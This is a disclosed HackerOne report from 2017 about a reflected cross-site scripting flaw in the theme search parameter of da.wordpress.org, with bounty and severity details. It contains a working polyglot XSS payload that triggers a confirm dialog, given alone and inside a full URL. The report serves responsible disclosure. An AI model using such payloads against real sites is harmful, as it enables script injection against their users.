@@ -1,0 +1,28 @@
+ReportLink:https://hackerone.com/reports/222040
+WeaknessName:Cross-site Scripting (XSS) - Reflected
+Reporter:https://hackerone.com/jon_bottarini
+ReportedTo:WordPress(wordpress)
+BountyAmount:387.5
+Severity:medium
+State:Closed
+DateOfDisclosure:26.07.2017 18:16:55
+
+Summary:
+
+Hello - 
+
+You have a reflected XSS vulnerability located at this domain:
+
+https://da.wordpress.org/themes/?s=
+
+This was tested on the latest version of Chrome (Version 57.0.2987.133 (64-bit)
+
+By entering this payload in the URL, you are able to execute a script to fire:
+
+`1%3C!%27/*%22/*\%27/*\%22/*--%3E%3C/Script%3E%3CImage%20Srcset=K%20*/;%20Onerror=confirm`1`%20//%3E#`
+
+Note that the "1" in the confirm is enclosed in backticks, the HackerOne editor just makes it difficult to show. I have attached a screenshot to show the full URL, as well as included it below: 
+
+https://da.wordpress.org/themes/?s=1%3C!%27/*%22/*\%27/*\%22/*--%3E%3C/Script%3E%3CImage%20Srcset=K%20*/;%20Onerror=confirm`1`%20//%3E#
+
+Please let me know if you have any other questions, thanks!
